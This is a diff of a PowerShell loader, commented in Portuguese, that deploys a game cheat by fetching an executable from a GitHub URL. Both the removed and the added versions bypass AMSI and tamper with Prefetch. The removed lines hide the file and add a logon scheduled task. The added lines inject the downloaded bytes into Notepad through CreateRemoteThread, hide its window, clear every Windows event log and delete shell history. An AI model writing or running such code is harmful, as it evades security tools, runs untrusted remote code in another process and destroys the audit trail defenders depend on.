@@ -1,36 +1,68 @@
 # 1. Bypass AMSI
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# 2. Desativa Prefetch
+# 2. Desativa Prefetch (para não gerar .pf)
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
 
-# 3. Baixa e esconde o cheat
+# 3. Baixa o cheat para a memória (Não salva no disco!)
 $url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
-$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
-(New-Object System.Net.WebClient).DownloadFile($url, $path)
-Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
+$bytes = (New-Object System.Net.WebClient).DownloadData($url)
 
-# 4. Cria atalho invisível via VBScript para não abrir janela
-$vbsPath = "$env:TEMP\sync.vbs"
-"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
+# 4. Código C# para criar processo na memória e esconder janela
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+public class GhostInject {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+    [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
 
-# 5. Persistência (Tarefa Agendada para rodar no login)
-$taskName = "WindowsSyncSystem"
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
+    public static void Run(string processName, byte[] payload) {
+        var procs = System.Diagnostics.Process.GetProcessesByName(processName);
+        if (procs.Length == 0) return;
+        IntPtr hProc = OpenProcess(0x1F0FFF, false, procs[0].Id);
+        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
+        UIntPtr written;
+        WriteProcessMemory(hProc, addr, payload, (uint)payload.Length, out written);
+        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        
+        System.Threading.Thread.Sleep(500);
+        IntPtr hWnd = procs[0].MainWindowHandle;
+        if (hWnd != IntPtr.Zero) {
+            ShowWindow(hWnd, 0);
+            int WS_EX_TOOLWINDOW = 0x00000080;
+            int GWL_EXSTYLE = -20;
+            int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
+            SetWindowLong(hWnd, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
+        }
+    }
+}
+"@
+Add-Type -TypeDefinition $code -Language CSharp
 
-# 6. Restaura Prefetch
+# 5. Inicia o Notepad para ser o hospedeiro do cheat
+Start-Process notepad.exe
+Start-Sleep -Milliseconds 500
+
+# 6. Injeta o cheat no Notepad
+[GhostInject]::Run("notepad", $bytes)
+
+# 7. Restaura Prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
 
-# 7. LIMPEZA PROFUNDA DE LOGS (O pulo do gato)
+# 8. LIMPEZA TOTAL (Event Logs + Registro)
 Start-Sleep -Seconds 1
-# Limpa o Event Viewer de Scripts e do PowerShell
-wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-wevtutil.exe cl "Windows PowerShell" 2>$null
-wevtutil.exe cl "Security" 2>$null
-wevtutil.exe cl "System" 2>$null
-
-# Limpa o histórico
+$logs = wevtutil el
+foreach ($log in $logs) { wevtutil cl "$log" 2>$null }
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\WinSyncClient" -ErrorAction SilentlyContinue
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinSyncClient" -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
